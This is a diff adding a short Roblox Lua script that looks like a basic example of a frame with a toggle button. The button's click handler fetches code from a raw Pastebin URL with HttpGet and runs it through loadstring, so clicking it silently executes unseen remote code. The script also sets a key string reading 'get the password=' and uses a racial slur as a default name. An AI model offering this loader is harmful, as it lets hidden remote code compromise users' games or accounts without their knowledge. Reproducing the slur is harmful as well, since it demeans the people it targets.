@@ -1,0 +1,22 @@
+-- Creating a simple frame with a toggle button in Roblox Lua (RBX.Lua)
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.BackgroundColor3 = Color3.new(0, 0, 1) -- Blue color
+frame.Parent = game.Workspace -- Change to appropriate parent
+
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0, 100, 0, 50)
+toggleButton.Position = UDim2.new(0, 50, 0, 25)
+toggleButton.BackgroundColor3 = Color3.new(1, 1, 1) -- White color
+toggleButton.Text = "Toggle"
+toggleButton.Parent = frame
+
+toggleButton.MouseButton1Click:Connect(function()
+    -- Your action when the button is clicked
+    loadstring(game:HttpGet("https://pastebin.com/raw/Jsdvaq30", true))() -- Replace the URL with your desired script
+end)
+
+local key = "get the password=" -- Change this to your desired key
+local name = "Neger" -- Change this to your desired name
+
